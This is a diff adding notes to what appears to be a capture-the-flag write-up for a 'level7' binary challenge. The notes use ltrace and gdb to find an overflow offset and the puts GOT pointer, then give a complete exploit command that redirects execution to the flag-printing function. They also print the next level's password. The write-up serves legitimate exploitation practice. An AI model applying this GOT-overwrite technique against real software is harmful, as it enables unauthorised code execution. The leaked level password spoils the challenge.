@@ -288,9 +288,43 @@ then it fgets the flag and saves it into a global variable c, but does nothing w
 
 so we could overwrite the destination address of the second strcpy by overflowing the first strcpy call ? to replace the puts got address to call m instead.
 
+address of m : 0x080484f4
+little endian : \xf4\x84\x04\x08
 
+now let's find the offset of :
 
+ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
 
+strcpy(0x0804a018, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...)       = 0x0804a018
+strcpy(0x37614136, NULL <unfinished ...>
+
+paste this address 0x37614136 : offset is 20 ! (cause its this one which will be overwritten.
+
+let's get the puts GOT address in gdb. (the pointer to overwrite)
+0x08048400
+\x00\x84\x04\x08 NOPE NO THIS ONE
+Cause we need not the overwrite the entire address of puts, but the pointer !
+
+so gdb ./level7 - info functions puts then get the adress and disassemble it
+disass 0x08048400
+
+0x08048400 <+0>:	jmp    *0x8049928
+   0x08048406 <+6>:	push   $0x28
+   0x0804840b <+11>:	jmp    0x80483a0
+   
+   so the first one is the pointer !
+0x8049928
+ little endian :\x28\x99\x04\x08
+
+test with ltrace to overwrite the second strcpy :
+
+python -c 'print "B" * 20 + "\x00\x84\x04\x08"'
+
+./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+
+pass for level8 : 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+
+level8 :
 
 
 
